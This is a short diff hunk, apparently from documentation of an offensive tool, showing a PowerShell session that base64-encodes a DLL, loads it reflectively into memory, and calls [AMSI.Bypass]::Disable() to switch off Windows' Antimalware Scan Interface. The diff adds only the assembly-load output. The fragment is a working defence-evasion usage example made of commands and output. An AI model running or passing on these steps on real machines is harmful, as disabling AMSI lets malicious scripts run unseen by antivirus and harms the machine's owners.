@@ -55,6 +55,10 @@ PS > $DLL = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("D:\
 
 PS > [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($DLL))
 
+GAC    Version        Location
+---    -------        --------
+False  v4.0.30319
+
 PS > [AMSI.Bypass]::Disable()
 0
 
